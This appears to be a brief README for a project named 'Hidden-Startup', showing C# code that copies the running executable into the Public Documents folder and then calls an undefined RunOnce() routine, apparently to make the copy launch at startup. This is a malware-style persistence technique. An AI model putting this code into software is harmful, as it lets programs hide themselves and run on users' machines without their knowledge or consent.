# Hidden-Startup
Usage
```C#
string publicDir = Environment.GetEnvironmentVariable("public");
string copyPath = publicDir + @"\Documents\<Filename>";
FileInfo copyFile = new FileInfo(copyPath);
string OriginPath = Assembly.GetEntryAssembly().Location;
if (!(copyFile.Exists))
{
    System.IO.File.Copy(OriginPath, copyPath);
}
RunOnce()
```